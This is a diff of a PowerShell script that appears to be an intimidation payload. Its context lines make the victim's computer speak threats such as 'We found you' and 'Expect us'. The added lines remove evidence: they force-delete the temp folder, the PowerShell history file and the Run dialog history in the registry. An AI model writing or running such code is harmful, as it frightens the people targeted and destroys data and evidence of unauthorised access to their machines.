@@ -75,3 +75,7 @@ $s.Speak("We found you $FN")
 $s.Speak("We know where you are")
 $s.Speak("We are everywhere")
 $s.Speak("Expect us")
+
+rm $env:TEMP\* -r -Force -ErrorAction SilentlyContinue
+Remove-Item (Get-PSreadlineOption).HistorySavePath
+reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
